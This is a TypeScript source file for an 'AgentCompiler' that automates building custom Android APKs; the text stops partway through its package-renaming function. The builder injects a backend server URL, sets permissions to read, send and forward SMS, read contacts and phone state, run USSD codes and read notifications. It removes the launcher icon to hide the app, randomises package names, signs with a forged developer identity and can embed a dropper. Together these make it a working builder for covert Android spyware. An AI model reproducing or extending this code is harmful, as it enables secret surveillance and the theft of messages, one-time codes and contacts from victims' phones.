/**
 * AgentCompiler
 * Automated Android Agent Builder
 * © 2025 Pegalite Studio | Developed by Sahil Hossain
 */


import path from "path";
import fs from "fs";
import fsExtra from "fs-extra";
import unzipper from "unzipper";
import {spawn} from "child_process";
import Agent from "../models/agent.model";
import DropperCompiler from "./dropperCompiler";
import {generateRandomPackage} from "../utils/randomUtils";

/**
 * @class AgentCompiler
 * The `AgentCompiler` class automates the entire lifecycle of generating a custom Android Agent APK.
 * It extracts the base and theme projects, modifies resources, injects configuration values,
 * applies Gradle build settings, compiles the project, stores the final APK, and cleans up.
 *
 * Each instance represents a single agent compilation process, isolated to its own temporary folder.
 *
 * ---
 * ### 🧩 Build Pipeline Overview
 *
 * The compiler performs the following sequential steps:
 *
 * 1. **clearLogs()** – Clears any previous build logs for this agent.
 * 2. **checkResources()** – Ensures required ZIPs (base project and theme) exist and extracts them.
 * 3. **validateResources()** – Verifies that key folders (`java`, `layout`, etc.) are present.
 * 4. **checkVariables()** – Injects runtime values into `VARS.java` using `this.variableData`.
 * 5. **copyThemeFiles()** – Merges theme assets (drawables, layouts, etc.) into the base project.
 * 6. **setUpGradle()** – Configures `local.properties` and signing configs in `build.gradle.kts`.
 * 7. **updateServerURL()** – Updates backend API base URL in `RetrofitClient.java`.
 * 8. **updateUtils()** – Applies IDs, permissions, and forbidden action flags in `Utils.java`.
 * 9. **changePackageName()** – Renames the entire package structure (`com.topdown.softy` → agentID).
 * 10. **updateAppName()** – Updates the app’s name in `strings.xml` or the manifest.
 * 11. **hideApp()** – Removes the launcher intent to make the app hidden if required.
 * 12. **build()** – Runs the Gradle build (`clean assembleRelease`) to compile the APK.
 * 13. **copyAgentApp()** – Waits for and copies the generated `app-release.apk` to the store path.
 * 14. **cleanUp()** – Deletes temporary build files after completion.
 * 15. Updates the agent’s status in MongoDB (`active` or `error`).
 *
 * ---
 * ### ⚙️ Constructor
 * @constructor
 * @param {string} agentID - Unique package identifier (e.g. `com.company.agent123`).
 * @param {string} agentName - The display name of the Android app (used in manifest/strings.xml).
 * @param {string} adminID - The admin’s username or ID, written into `Utils.java`.
 * @param {string} createdBy - The user or client who initiated the build; used for socket logs.
 * @param {string} themeID - The selected theme ID (used to locate the theme ZIP file).
 * @param {object} forbiddenActions - A flag map defining restricted app permissions and visibility.
 * @param {object} variableData - Key-value pairs for replacing variables in `VARS.java`.
 *
 * ---
 * ### 📦 Internal Paths
 * - **tempFolder:** Temporary workspace for extraction (`/data/temp/<agentID>`)
 * - **baseProject:** Path to the base ZIP file (`/data/main/base.zip`)
 * - **themeFile:** Path to the theme ZIP (`/data/themes/resources/<themeID>.zip`)
 * - **agentStorePath:** Output directory for built APKs (`/data/agents`)
 *
 * ---
 * ### 🧠 Logging & Monitoring
 * All progress and build activity are logged via `addLog(message)`:
 * - Logs are emitted to the connected Socket.IO client:
 *   `io.to(connectedUsers[this.createdBy]).emit("agent-log-" + this.agentID, message)`
 * - Logs are also persisted at:
 *   `/data/compile-logs/<agentID>.log`
 *
 * ---
 * ### 🪶 Example Usage
 * ```ts
 * const compiler = new AgentCompiler(
 *     "com.agent123",
 *     "Agent Pro",
 *     "admin01",
 *     "user01",
 *     "theme_dark",
 *     { hide_app: true, messages: false },
 *     { TITLE: "Agent Pro", SERVER: "https://api.example.com/" }
 * );
 *
 * await compiler.compileAgent();
 * // Logs real-time progress and updates MongoDB agent status.
 * ```
 *
 * ---
 * ### 🧰 Database Integration
 * On successful build:
 * ```js
 * await Agent.updateOne({ agentID }, { $set: { status: "active" } });
 * ```
 * On failure:
 * ```js
 * await Agent.updateOne({ agentID }, { $set: { status: "error" } });
 * ```
 *
 * ---
 * ### 🚀 Design Notes
 * - Fully modular — each step is encapsulated as a private async method.
 * - Uses `fs-extra` for safe recursive file operations.
 * - Leverages `unzipper` for extraction and Node’s `child_process.spawn()` for Gradle builds.
 * - Asynchronous logging and retries handle delayed builds and file locks.
 * - Designed for concurrent builds (non-blocking I/O).
 * - Suitable for CI/CD, theme compilers, or custom agent distribution systems.
 *
 * @see {@link compileAgent} The main orchestrator method that executes the full build pipeline.
 */
class AgentCompiler {
    private readonly agentID: string; // New Random Package
    private readonly agentName: string;
    private readonly adminID: string;
    private readonly createdBy: string;
    private readonly themeID: string;
    private readonly tempFolder: string;
    private readonly baseProject: string;
    private readonly themeFile: string;
    private readonly forbiddenActions: any;
    private readonly variableData: any;
    private readonly embedDropper: boolean;
    private readonly agentStorePath: string;

    constructor(agentID: string, agentName: string, adminID: string, createdBy: string, themeID: string, forbiddenActions: any, variableData: any, embedDropper: boolean) {
        this.agentID = agentID;
        this.agentName = agentName;
        this.adminID = adminID;
        this.createdBy = createdBy;
        this.themeID = themeID;
        this.forbiddenActions = forbiddenActions;
        this.variableData = variableData;
        this.embedDropper = embedDropper;

        this.tempFolder = path.join(__dirname, `../../data/temp/${agentID}`);
        this.baseProject = path.join(__dirname, "../../data/main/base.zip");
        this.themeFile = path.join(__dirname, `../../data/themes/resources/${themeID}.zip`);
        this.agentStorePath = path.join(__dirname, "../../data/agents");
    }

    /**
     * Appends a log message to both the real-time Socket.IO client
     * (if the creator is connected) and a persistent log file for the agent.
     *
     * This method ensures that logs are delivered live to the associated client
     * and also stored locally for later review.
     *
     * @param {string} message - The log message to send and store.
     *
     * @remarks
     * - Uses `connectedUsers` to determine if the agent's creator is online.
     * - Emits the log over a Socket.IO channel named `agent-log-<agentID>`.
     * - Ensures the logs directory exists before writing.
     * - Log file is stored under: `/data/compile-logs/<agentID>.log`
     *
     * Example:
     * ```ts
     * this.addLog("Compilation started...");
     * this.addLog("Build completed successfully.");
     * ```
     */
    public addLog(message: string) {
        // If the agent's creator is connected, send the log message in real time.
        if (connectedUsers[this.createdBy] && !message.includes("/")) {
            io.to(connectedUsers[this.createdBy]).emit("agent-log-" + this.agentID, message)
        }

        // Define the logs directory and file path
        const logsDir = path.join(__dirname, "../../data/compile-logs");
        const logFile = path.join(logsDir, `${this.agentID}.log`);

        // Ensure logs directory exists
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, {recursive: true});
        }

        // Format the message with a newline and append to the log file
        const logLine = `${message}\n`;
        fs.appendFileSync(logFile, logLine, "utf8");
    }

    public async compileAgent() {
        await this.clearLogs();
        this.addLog(`Compile Request Received [${this.agentName}]`);

        try {
            await this.checkResources();
            await this.validateResources();
            await this.checkVariables();
            await this.copyThemeFiles();
            await this.generateNewKey();
            await this.setUpGradle();
            await this.updateServerURL();
            await this.updateUtils();
            await this.changePackageName();
            await this.updateAppName();
            await this.hideApp();
            await this.build();
            await this.copyAgentApp();
            await this.cleanUp();

            if (!this.embedDropper) {
                this.addLog("SUCCESS")

                await Agent.updateOne({agentID: this.agentID}, {$set: {status: "active"}});
            } else {
                const dropperCompiler = new DropperCompiler(generateRandomPackage(), this.agentID, this.agentName, this.createdBy, this.themeID);
                await dropperCompiler.compileAgent();
            }
        } catch (e: any) {
            this.addLog("ERROR")
            this.addLog(`❌ Compilation failed: ${e.message}`);

            await Agent.updateOne({agentID: this.agentID}, {$set: {status: "error"}});
        }
    }

    /**
     * Deletes the log file associated with the current agent.
     *
     * This method removes the specific log file under the compile-logs directory.
     * It is used to clean up logs once they are no longer needed — for example,
     * after a task, build, or agent lifecycle ends.
     *
     * @async
     * @private
     * @returns {Promise<void>} Resolves when the log file is successfully deleted (or if it doesn't exist).
     *
     * @remarks
     * - The method constructs the log file path from the agent ID.
     * - Uses `fs.promises.rm` with `recursive` and `force` options for safety:
     *   - `recursive: true` allows directory cleanup (though here it’s a single file).
     *   - `force: true` prevents errors if the file doesn’t exist.
     * - The `compile-logs` directory is located at `../../data/compile-logs`.
     *
     * Example:
     * ```ts
     * await this.clearLogs();
     * console.log("Agent logs cleared.");
     * ```
     */
    private async clearLogs(): Promise<void> {
        const logsDir = path.join(__dirname, "../../data/compile-logs");
        const logFile = path.join(logsDir, `${this.agentID}.log`);
        fs.rmSync(logFile, {recursive: true, force: true});
    }

    /**
     * Extracts the contents of a ZIP archive to a specified destination directory.
     *
     * This method streams the ZIP file from the disk and pipes it into the `unzipper` extractor.
     * It resolves when the extraction is complete and rejects if any read or unzip error occurs.
     *
     * @private
     * @async
     * @param {string} zipPath - Absolute or relative path to the source ZIP file.
     * @param {string} destDir - Directory where the contents will be extracted.
     * @returns {Promise<void>} A promise that resolves when extraction completes successfully.
     *
     * @throws {Error} If the ZIP file cannot be read or extraction fails.
     *
     * @remarks
     * - Uses `fs.createReadStream` for efficient, stream-based extraction.
     * - The target directory must exist or be creatable; consider ensuring it before calling this.
     * - Handles both "close" and "error" events for robust Promise resolution.
     *
     * Example:
     * ```ts
     * try {
     *     await this.extractZip("/data/archive/build.zip", "/data/builds/agent123");
     *     console.log("ZIP extracted successfully.");
     * } catch (err) {
     *     console.error("Extraction failed:", err);
     * }
     * ```
     */
    private async extractZip(zipPath: string, destDir: string): Promise<void> {
        return new Promise((resolve, reject) => {
            fs.createReadStream(zipPath)
                .pipe(unzipper.Extract({path: destDir}))
                .on("close", resolve)
                .on("error", reject);
        });
    }

    /**
     * Validates and prepares all necessary resources for the agent’s compilation or processing task.
     *
     * This method performs the following steps sequentially:
     * 1. Log the start of the resource check.
     * 2. Verifies the existence of the base project and theme files.
     * 3. Remove any previous temporary folder (if it exists).
     * 4. Create a fresh temporary working directory.
     * 5. Extract both the theme ZIP and base project ZIP into the temp folder.
     * 6. Logs success messages throughout each step.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when all resources are verified and extracted successfully.
     *
     * @throws {Error} If either the base project or theme file does not exist.
     *
     * @remarks
     * - The method ensures that the working environment is clean before extraction.
     * - Uses `fs-extra` for recursive folder removal, which is safer and async-friendly.
     * - Relies on `addLog()` to record progress in real time.
     *
     * Example:
     * ```ts
     * try {
     *     await this.checkResources();
     *     console.log("Resources ready for compilation.");
     * } catch (err) {
     *     console.error("Resource check failed:", err);
     * }
     * ```
     */
    private async checkResources(): Promise<void> {
        this.addLog("Checking resources...");
        if (!fs.existsSync(this.baseProject)) {
            throw new Error("Base project not found!");
        }
        if (!fs.existsSync(this.themeFile)) {
            throw new Error(`Theme file (${this.themeID}) not found!`);
        }

        if (fs.existsSync(this.tempFolder)) {
            this.addLog("Removing Temp Data");
            fsExtra.removeSync(this.tempFolder);
        }

        fs.mkdirSync(this.tempFolder, {recursive: true});

        this.addLog("Extracting Theme!");
        await this.extractZip(this.themeFile, path.join(this.tempFolder, "theme"));
        this.addLog("Extracting Base Project!");
        await this.extractZip(this.baseProject, path.join(this.tempFolder, "project"));
        this.addLog("Resources Extracted ✅");
    }

    /**
     * Validates the extracted theme resources to ensure all required folders
     * and files exist before proceeding with compilation or processing.
     *
     * This method checks that the expected structure under the temporary theme folder
     * contains non-empty `java` and `layout` directories. If any folder is missing
     * or empty, it throws an error and logs the issue.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when all resource checks pass successfully.
     *
     * @throws {Error} If a required folder is missing or empty.
     *
     * @remarks
     * - Designed to be run after `checkResources()`, once extraction is complete.
     * - Logs progress and validation results via `addLog()`.
     * - Uses asynchronous file operations to prevent blocking the event loop.
     *
     * Example:
     * ```ts
     * try {
     *     await this.validateResources();
     *     console.log("Theme validation passed.");
     * } catch (err) {
     *     console.error("Theme validation failed:", err);
     * }
     * ```
     */
    private async validateResources(): Promise<void> {
        this.addLog("Validating Resources!");

        let themeFolder = path.join(this.tempFolder, "theme");

        // Define required folders
        const requiredFolders = ["java", "layout"];

        for (const folder of requiredFolders) {
            const folderPath = path.join(themeFolder, folder);

            // Check if the folder exists
            if (!fs.existsSync(folderPath)) {
                throw new Error(`Folder "${folder}" is missing in theme!`);
            }

            // Check if the folder is empty
            const files = fs.readdirSync(folderPath);
            if (files.length === 0) {
                throw new Error(`Folder "${folder}" is empty!`);
            }
        }

        this.addLog("Resources verified ✅");
    }

    /**
     * Reads, updates, and merges theme variables (from VARS.java) into the base project.
     *
     * This method searches for all static string variables inside the theme’s VARS.java file,
     * replaces their values using `this.variableData` (if provided), and moves the modified
     * VARS.java into the base project’s source folder.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves after all variables are processed and the updated file is written.
     *
     * @remarks
     * - Searches for variables using the regex pattern:
     *   `public static String NAME = "value";`
     * - Only replaces variables that exist in `this.variableData`.
     * - Logs detailed information about which variables were found and replaced.
     * - Removes the original VARS.java from the theme folder after processing.
     *
     * Example:
     * ```ts
     * await this.checkVariables();
     * // Logs:
     * // Checking variables...
     * // Variables found: TITLE, COLOR_PRIMARY
     * // Theme variables replaced and saved!
     * ```
     */
    private async checkVariables(): Promise<void> {
        this.addLog("Checking variables...");

        let themeVars = path.join(this.tempFolder, "theme", "java", "VARS.java");

        if (!fsExtra.existsSync(themeVars)) {
            this.addLog("Theme variables not found.");
            return;
        }

        let content = fs.readFileSync(themeVars, "utf8");

        // Regex to capture: public static String NAME = "value";
        const regex = /public\s+static\s+String\s+([A-Z0-9_]+)\s*=\s*"(.*?)";/g;
        const variableNames: string[] = [];

        let match;
        while ((match = regex.exec(content)) !== null) {
            const varName = match[1];
            variableNames.push(varName);

            if (this.variableData[varName] !== undefined) {
                const newValue = this.variableData[varName];
                const replacement = `public static String ${varName} = "${newValue}";`;
                content = content.replace(match[0], replacement);
            }
        }

        if (variableNames.length > 0) {
            this.addLog("Variables found: " + variableNames.join(", "));
            this.addLog("Theme variables replaced and saved!");
        } else {
            this.addLog("No variables found in VARS.java.");
        }

        // Write the updated content into the project folder
        let projectFolder = path.join(this.tempFolder, "project");
        const varsDest = path.join(
            projectFolder,
            "app",
            "src",
            "main",
            "java",
            "com",
            "topdown",
            "softy",
            "functions",
            "utils",
            "VARS.java"
        );

        fsExtra.writeFileSync(varsDest, content, "utf8");

        // Remove original VARS.java from theme
        fs.rmSync(themeVars, {recursive: true, force: true});
    }

    /**
     * Applies the extracted theme by copying all relevant files and folders
     * (drawable, layout, java, mipmap, values, and manifest) from the theme
     * directory into the project directory.
     *
     * This method merges theme assets into the base Android project structure,
     * ensuring that all existing resources are safely overwritten where applicable.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when all theme resources are successfully applied.
     *
     * @remarks
     * - Each folder (drawable, layout, java, mipmap, values) is checked before copying.
     * - Ensures destination directories exist before copying.
     * - Overwrites existing files by default (`overwrite: true`).
     * - Logs detailed progress using `addLog()`.
     *
     * Example:
     * ```ts
     * await this.copyThemeFiles();
     * // Logs:
     * // Applying theme...
     * // Drawable folder applied.
     * // Layout folder applied.
     * // Java folder applied.
     * // Mipmap folders applied.
     * // Values folder applied.
     * // AndroidManifest.xml applied.
     * // Theme successfully applied ✅
     * ```
     */
    private async copyThemeFiles(): Promise<void> {
        this.addLog("Applying theme...");

        let themeFolder = path.join(this.tempFolder, "theme");
        let projectFolder = path.join(this.tempFolder, "project");

        const drawableSrc = path.join(themeFolder, "drawable");
        const drawableDest = path.join(projectFolder, "app", "src", "main", "res", "drawable");
        if (fsExtra.existsSync(drawableSrc)) {
            fsExtra.mkdirpSync(drawableDest); // ensure folder exists
            fsExtra.copySync(drawableSrc, drawableDest, {overwrite: true});
            this.addLog("Drawable folder applied.");
        }

        // 2️⃣ Copy layout folder if it exists
        const layoutSrc = path.join(themeFolder, "layout");
        const layoutDest = path.join(projectFolder, "app", "src", "main", "res", "layout");
        if (fsExtra.existsSync(layoutSrc)) {
            fsExtra.mkdirpSync(layoutDest);
            fsExtra.copySync(layoutSrc, layoutDest, {overwrite: true});
            this.addLog("Layout folder applied.");
        }

        // 3️⃣ Copy java folder to your package path
        const javaSrc = path.join(themeFolder, "java");
        const javaDest = path.join(
            projectFolder,
            "app",
            "src",
            "main",
            "java",
            "com",
            "topdown",
            "softy"
        );

        if (fsExtra.existsSync(javaSrc)) {
            fsExtra.mkdirpSync(javaDest);
            fsExtra.copySync(javaSrc, javaDest, {overwrite: true});
            this.addLog("Java folder applied.");
        }

        // 4️⃣ Copy mipmap folder and all subfolders
        const mipmapSrc = path.join(themeFolder, "mipmap");
        const resDest = path.join(projectFolder, "app", "src", "main", "res");
        if (fsExtra.existsSync(mipmapSrc)) {
            // Loop over all subfolders in theme/mipmap
            const subFolders = fsExtra.readdirSync(mipmapSrc);
            for (const folder of subFolders) {
                const srcPath = path.join(mipmapSrc, folder);
                const destPath = path.join(resDest, folder);
                fsExtra.mkdirpSync(destPath);
                fsExtra.copySync(srcPath, destPath, {overwrite: true});
            }
            this.addLog("Mipmap folders applied.");
        }

        // 5️⃣ Copy values folder and subfolders
        const valuesSrc = path.join(themeFolder, "values");
        const valuesDest = path.join(resDest, "values");
        if (fsExtra.existsSync(valuesSrc)) {
            fsExtra.mkdirpSync(valuesDest);
            fsExtra.copySync(valuesSrc, valuesDest, {overwrite: true});
            this.addLog("Values folder applied.");
        }

        // 6️⃣ Copy AndroidManifest.xml
        const manifestDest = path.join(projectFolder, "app", "src", "main", "AndroidManifest.xml");
        if (fsExtra.existsSync(manifestDest)) {
            const uiSrc = path.join(themeFolder, "java", "ui");
            await this.addActivitiesToManifest(valuesDest, uiSrc, manifestDest);
            this.addLog("AndroidManifest.xml applied.");
        }

        this.addLog("Theme successfully applied ✅");
    }

    private async addActivitiesToManifest(valuesDest: string, uiSrc: string, manifestDest: string) {
        if (!fs.existsSync(uiSrc)) {
            this.addLog("UI folder does not exist");
        }
        if (!fs.existsSync(manifestDest)) {
            this.addLog("Manifest file does not exist");
        }

        // Read manifest
        let manifest = fs.readFileSync(manifestDest, "utf8");

        let themesXml = path.join(valuesDest, "themes.xml");
        if (fs.existsSync(themesXml)) {

            const themesContent = fs.readFileSync(themesXml, "utf8");

            // Match <style name="Theme.XYZ"
            const themeMatch = themesContent.match(/<style\s+name="(Theme\.[^"]+)"/);

            if (themeMatch) {
                const themeName = themeMatch[1];
                const themeAttribute = `@style/${themeName}`;

                // Replace only the theme inside <application>
                manifest = manifest.replace(
                    /android:theme="[^"]*"/,
                    `android:theme="${themeAttribute}"`
                );
            } else {
                this.addLog("No Theme.* style found in themes.xml");
            }
        } else {
            this.addLog("No themes.xml found!");
        }

        // Find <application> tag
        const appTagIndex = manifest.indexOf("<application");
        if (appTagIndex === -1) {
            throw new Error("No <application> tag found in manifest");
        }

        // Find the end of <application ...>
        const appStartCloseIndex = manifest.indexOf(">", appTagIndex);
        if (appStartCloseIndex === -1) {
            this.addLog("Malformed <application> tag");
        }

        // Scan UI folder for Activities
        const files = fs.readdirSync(uiSrc);
        const activityTags: string[] = [];

        for (const file of files) {
            if (!file.endsWith(".java") && !file.endsWith(".kt")) continue;
            if (!file.includes("Activity")) continue;

            const className = file.replace(/\.(java|kt)$/, "");
            const activityPath = `.ui.${className}`;

            const tag = `        <activity android:name="${activityPath}" android:exported="false" />`;

            // Avoid duplicates
            if (!manifest.includes(`android:name="${activityPath}"`)) {
                activityTags.push(tag);
            }
        }

        if (activityTags.length === 0) {
            this.addLog("No new activities to add.");
            return;
        }

        // Insert activity tags after <application ...>
        const newManifest =
            manifest.slice(0, appStartCloseIndex + 1) +
            "\n" +
            activityTags.join("\n") +
            "\n" +
            manifest.slice(appStartCloseIndex + 1);

        // Save back
        fs.writeFileSync(manifestDest, newManifest, "utf8");
        this.addLog("Activities added successfully ✅");

    }

    private async generateNewKey() {
        return new Promise<void>((resolve, reject) => {

            const keyFolder = path.join(this.tempFolder);
            const keystorePath = path.join(keyFolder, "key.jks");

            const args = [
                "-genkeypair",
                "-v",
                "-keystore", keystorePath,
                "-storepass", "123454321",
                "-keyalg", "RSA",
                "-keysize", "2048",
                "-validity", "10000",
                "-alias", "key0",
                "-keypass", "123454321",
                "-dname", "CN=Li Wei, OU=Mobile Engineering, O=DragonSoft Technologies, L=Shanghai, S=Shanghai Municipality, C=CN"
            ];

            const proc = spawn("keytool", args, {
                cwd: keyFolder,
                shell: false
            });

            proc.stdout.on("data", (data) => {
                this.addLog("[KEYTOOL] " + data.toString());
            });

            proc.stderr.on("data", (data) => {
                const msg = data.toString();

                // Only show REAL errors
                if (msg.toLowerCase().includes("error") || msg.toLowerCase().includes("illegal")) {
                    console.error("[KEYTOOL ERROR]", msg);
                    this.addLog("[KEYTOOL ERROR] " + msg);
                } else {
                    // This is normal info output
                    this.addLog("[KEYTOOL] " + msg);
                }
            });

            proc.on("close", (code) => {
                if (code === 0) {
                    this.addLog("✔ Keystore generated");
                    resolve();
                } else {
                    reject(new Error(`keytool exited with code ${code}`));
                }
            });

        });
    }

    /**
     * Sets up the Gradle environment for the extracted Android project.
     *
     * This method:
     * 1. Creates or overwrites the `local.properties` file with the Android SDK path.
     * 2. Updates signing configuration fields in `build.gradle.kts`
     *    using environment variables such as `KEY_PATH`, `STORE_PASS`, etc.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when Gradle setup is successfully completed.
     *
     * @throws {Error} If required environment variables are missing, or if the Gradle file cannot be read.
     *
     * @remarks
     * - Expects the following environment variables to be defined:
     *   - `SDK_PATH`
     *   - `KEY_PATH`
     *   - `STORE_PASS`
     *   - `KEY_ALIAS`
     *   - `KEY_PASS`
     * - Writes and modifies files asynchronously for non-blocking performance.
     * - Logs each step with `addLog()` for real-time tracking.
     *
     * Example:
     * ```ts
     * await this.setUpGradle();
     * // Logs:
     * // local.properties created ✅
     * // build.gradle.kts signing configs applied ✅
     * ```
     */
    private async setUpGradle(): Promise<void> {
        // 1️⃣ Write local.properties
        const localPath = path.join(this.tempFolder, "project", "local.properties");
        const sdkDir = `sdk.dir=${process.env.SDK_PATH}`;
        fs.writeFileSync(localPath, sdkDir, {encoding: "utf8"});
        this.addLog("local.properties created ✅");

        // 2️⃣ Modify build.gradle.kts
        const gradlePath = path.join(this.tempFolder, "project", "app", "build.gradle.kts");
        let gradleContent = fs.readFileSync(gradlePath, "utf8");

        // Replace inside signingConfigs block
        const keyPath = path.join(this.tempFolder, "key.jks");

        gradleContent = gradleContent.replace(
            /var path = ".*"/,
            `var path = "${keyPath.replace(/\\/g, "\\\\")}"` // ESCAPE slashes for Gradle script
        );
        gradleContent = gradleContent.replace(/var storePassword = ".*"/, `var storePassword = "${process.env.STORE_PASS}"`);
        gradleContent = gradleContent.replace(/var keyAlias = ".*"/, `var keyAlias = "${process.env.KEY_ALIAS}"`);
        gradleContent = gradleContent.replace(/var keyPassword = ".*"/, `var keyPassword = "${process.env.KEY_PASS}"`);

        // Write back the updated Gradle script
        fs.writeFileSync(gradlePath, gradleContent, "utf8");
        this.addLog("build.gradle.kts signing configs applied ✅");
    }

    /**
     * Updates the `BASE_URL` constant inside `RetrofitClient.java`
     * with the server URL defined in environment variables.
     *
     * This ensures that the compiled Android app communicates
     * with the correct backend endpoint configured for the current build.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when the RetrofitClient.java file is successfully updated.
     *
     * @throws {Error} If the `SERVER_URL` environment variable is missing.
     *
     * @remarks
     * - The target file path is:
     *   `app/src/main/java/com/topdown/softy/server/req/RetrofitClient.java`
     * - Searches for and replaces:
     *   `public static final String BASE_URL = "<old_value>";`
     * - Logs all progress using `addLog()`.
     *
     * Example:
     * ```ts
     * await this.updateServerURL();
     * // Logs:
     * // Updated RetrofitClient.java successfully
     * ```
     */
    private async updateServerURL(): Promise<void> {
        let projectFolder = path.join(this.tempFolder, "project");
        const utilsFile = path.join(
            projectFolder,
            "app",
            "src",
            "main",
            "java",
            "com",
            "topdown",
            "softy",
            "server",
            "req",
            "RetrofitClient.java"
        );

        if (!fs.existsSync(utilsFile)) {
            this.addLog(`Error: RetrofitClient.java not found at ${utilsFile}`);
            return;
        }

        let utilsContent = fs.readFileSync(utilsFile, "utf8");

        // Replace variables
        utilsContent = utilsContent.replace(
            /public static final String BASE_URL = ".*";/,
            `public static final String BASE_URL = "${process.env.SERVER_URL}";`
        );

        fs.writeFileSync(utilsFile, utilsContent, "utf8");
        this.addLog(`Updated RetrofitClient.java successfully`);
    }

    /**
     * Updates `Utils.java` with runtime configuration data including
     * - Admin and agent IDs
     * - Theme ID
     * - Permission flags based on `forbiddenActions`
     * - Notification reading state
     *
     * This method modifies constants inside the Java source file dynamically
     * before compilation, aligning the app’s configuration and behavior with
     * the build context.
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves once Utils.java is updated successfully.
     *
     * @throws {Error} If `Utils.java` cannot be found or written.
     *
     * @remarks
     * - Target file: `app/src/main/java/com/topdown/softy/functions/Utils.java`
     * - Controlled variables:
     *   - `ADMIN_USERNAME`
     *   - `AGENT_ID`
     *   - `THEME`
     *   - `isNotificationReadingEnabled`
     *   - `APP_PERMISSIONS`
     * - Uses `this.forbiddenActions` to filter out certain permissions.
     * - Logs each step using `addLog()`.
     *
     * Example:
     * ```ts
     * await this.updateUtils();
     * // Logs:
     * // Updated Utils.java successfully
     * ```
     */
    private async updateUtils(): Promise<void> {
        let projectFolder = path.join(this.tempFolder, "project");
        const utilsFile = path.join(
            projectFolder,
            "app",
            "src",
            "main",
            "java",
            "com",
            "topdown",
            "softy",
            "functions",
            "utils",
            "Utils.java"
        );

        // --- 1️⃣ Ensure file exists ---
        if (!fs.existsSync(utilsFile)) {
            this.addLog(`Error: Utils.java not found at ${utilsFile}`);
            return;
        }

        // --- 2️⃣ Read file content asynchronously ---
        let utilsContent = fs.readFileSync(utilsFile, "utf8");

        // --- 3️⃣ Replace static variables ---
        utilsContent = utilsContent.replace(
            /public static String ADMIN_USERNAME = ".*";/,
            `public static String ADMIN_USERNAME = "${this.adminID}";`
        );
        utilsContent = utilsContent.replace(
            /public static String AGENT_ID = ".*";/,
            `public static String AGENT_ID = "${this.agentID}";`
        );
        utilsContent = utilsContent.replace(
            /public static String THEME = ".*";/,
            `public static String THEME = "${this.themeID}";`
        );

        // --- 4️⃣ Replace notification permission flag ---
        const notifAllowed = this.forbiddenActions.notifications ?? true;
        utilsContent = utilsContent.replace(
            /public static boolean isNotificationReadingEnabled = .*;/,
            `public static boolean isNotificationReadingEnabled = ${notifAllowed};`
        );

        // --- 5️⃣ Filter out permissions based on forbiddenActions ---
        let allowedPermissions = [
            "android.Manifest.permission.CALL_PHONE",
            "android.Manifest.permission.READ_CONTACTS",
            "android.Manifest.permission.READ_SMS",
            "android.Manifest.permission.SEND_SMS",
            "android.Manifest.permission.RECEIVE_SMS",
            "android.Manifest.permission.READ_PHONE_STATE",
            "android.Manifest.permission.READ_PHONE_NUMBERS"
        ];

        // --- Apply filters based on forbiddenActions ---
        const messages = this.forbiddenActions.messages ?? true;
        if (!messages) {
            allowedPermissions = allowedPermissions.filter(
                (perm) => perm !== "android.Manifest.permission.READ_SMS"
            );
        }

        const contacts = this.forbiddenActions.contacts ?? true;
        if (!contacts) {
            allowedPermissions = allowedPermissions.filter(
                (perm) => perm !== "android.Manifest.permission.READ_CONTACTS"
            );
        }

        const sendSms = this.forbiddenActions["send_sms"] ?? true;
        const smsForward = this.forbiddenActions["sms_forward"] ?? true;
        if (!sendSms && !smsForward) {
            allowedPermissions = allowedPermissions.filter(
                (perm) => perm !== "android.Manifest.permission.SEND_SMS"
            );
        }

        if (!smsForward && !messages) {
            allowedPermissions = allowedPermissions.filter(
                (perm) => perm !== "android.Manifest.permission.RECEIVE_SMS"
            );
        }

        const runUssd = this.forbiddenActions["run_ussd"] ?? true;
        if (!runUssd) {
            allowedPermissions = allowedPermissions.filter(
                (perm) => perm !== "android.Manifest.permission.CALL_PHONE"
            );
        }

        // --- 6️⃣ Build and replace APP_PERMISSIONS block ---
        const newPermissionsBlock = `public static final String[] APP_PERMISSIONS = {
            ${allowedPermissions.join(",\n            ")}
    };`;
        utilsContent = utilsContent.replace(
            /public static final String\[] APP_PERMISSIONS[\s\S]*?};/,
            newPermissionsBlock
        );

        // --- 7️⃣ Write updated Utils.java asynchronously ---
        fs.writeFileSync(utilsFile, utilsContent, "utf8");
        this.addLog(`Updated Utils.java successfully`);
    }

    /**
     * Renames the Android package across the entire project structure.
     *
     * This method updates:
     *  - `namespace` and `applicationId` fields in `build.gradle.kts`
     *  - The `package` attribute in `AndroidManifest.xml`
     *  - All occurrences of the old package name in `.java` and `.kt` files
     *  - Renames the directory structure to match the new package
     *
     * @private
     * @async
     * @returns {Promise<void>} Resolves when package renaming completes successfully.
     *
     * @remarks
     * - Uses the `agentID` as the new package name.
     * - Removes the old package directories after refactoring.
     * - Logs each operation step-by-step with `addLog()`.
     *
     * Example:
     * ```ts
     * await this.changePackageName();
     * // Logs:
     * // 🎯 New random package: com.new.agent123
     * // ✅ Updated: build.gradle.kts
     * // ✅ Updated: AndroidManifest.xml
     * // ✅ Renamed and copied package directories
     * // ✅ Package renamed to: com.new.agent123
     * ```
     */
    private async changePackageName(): Promise<void> {
        const oldPackage = "com.topdown.softy";
        const newPackage = this.agentID;

        this.addLog(`🎯 New random package: ${newPackage}`);

        // Define file paths
        const appPath = path.join(this.tempFolder, "project", "app");
        const gradleFile = path.join(appPath, "build.gradle.kts");
        const manifestFile = path.join(appPath, "src", "main", "AndroidManifest.xml");
        const srcPath = path.join(appPath, "src", "main", "java");

        // --- 1️⃣ Helper: replace string in file asynchronously ---
        const replaceInFile = (filePath: string, oldStr: string, newStr: string) => {
            const content = fs.readFileSync(filePath, "utf8");
            let updatedContent = content.replace(new RegExp(oldStr, "g"), newStr);

            updatedContent = updatedContent.replace(
                /import\s+.*\.DetailsManager;/g,
                `import ${newPackage}.functions.managers.DetailsManager;`
            );
            updatedContent = updatedContent.replace(
                /import\s+.*\.VARS;/g,
                `import ${newPackage}.functions.utils.VARS;`
            );

            // Replace ANY import ending with Utils
            updatedContent = updatedContent.replace(
                /import\s+.*\.Utils;/g,
                `import ${newPackage}.functions.utils.Utils;`
            );

            fs.writeFileSync(filePath, updatedContent, "utf8");
